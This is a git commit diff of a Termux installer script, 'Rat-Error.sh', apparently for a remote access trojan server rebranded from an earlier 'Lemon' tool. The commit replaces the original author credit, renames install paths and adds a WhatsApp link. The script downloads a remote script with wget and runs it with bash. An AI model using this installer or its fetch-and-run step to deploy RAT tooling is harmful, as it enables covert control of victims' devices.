eacfa3c457f971a7cdf192b40097957714d7ed01
SAMIDU <122571416+samifu@users.noreply.github.com>
2023-11-03 21:23:10 +0530

    Update Rat-Error.sh

--- Rat-Error.sh
+++ Rat-Error.sh
@@ -40,7 +40,7 @@ echo '
                 Developed By SAMIDU
                            
 ' | lolcat                           
- echo -e "\e[1;31m [\e[32m√\e[31m] \e[1;91m by \e[1;36mRaj Aryan \e[93m/ \e[100;92m Youtube.com/c/H4Ck3R0\e[0m"
+ echo -e "\e[1;31m [\e[32m√\e[31m] \e[1;91m by \e[1;36m Samidu Jayasundara \e[93m/ \e[100;92m Dark-Error/c/SAMIDU\e[0m"
  echo -e "\e[34m[\e[92m✓\e[34m]\033[92m INSTALLING REQUIREED PACKAGES"
  sleep 6.0
  apt install nodejs nano yarn -y
@@ -52,15 +52,15 @@ echo '
               
                   
 cd /data/data/com.termux/files/usr/share/
-mkdir lemon 
-cd $HOME/Lemon-termux/.files
+mkdir Rat-Error 
+cd $HOME/Rat-Error/.files
 pkg install wget && wget https://github.com/h4ck3r0/Java-termux/releases/download/javafix.sh/javafix.sh && bash javafix.sh
-cp -r app assets clientData includes index.js package-lock.json package.json /data/data/com.termux/files/usr/share/lemon/
-sed -i 'ccd $PREFIX/share/lemon/ && node index.js' $HOME/Lemon-termux/lemon
-cp -r $HOME/Lemon-termux/lemon /data/data/com.termux/files/usr/bin/
-chmod +x /data/data/com.termux/files/usr/bin/lemon
+cp -r app assets clientData includes index.js package-lock.json package.json /data/data/com.termux/files/usr/share/Rat-Error/
+sed -i 'ccd $PREFIX/share/Rat-Error/ && node index.js' $HOME/Rat-Error/Rat-Error
+cp -r $HOME/Rat-Error/Rat-Error /data/data/com.termux/files/usr/bin/
+chmod +x /data/data/com.termux/files/usr/bin/Rat-Error
 
-cd /data/data/com.termux/files/usr/share/lemon/
+cd /data/data/com.termux/files/usr/share/Rat-Error/
 yarn add expressjs
 clear
 echo -e "\e[34mINSTALLED SUCCESSFULLY....[\e[92m✓\e[34m]\e[92m"
@@ -70,5 +70,5 @@ clear
 echo -e "\e[1;34m[√] \e[96mType Rat-Error To Start Server\e[0m"
 
 
-termux-open-url https://www.h4ck3r.me/
+termux-open-url https://wa.me/+94761652230
 
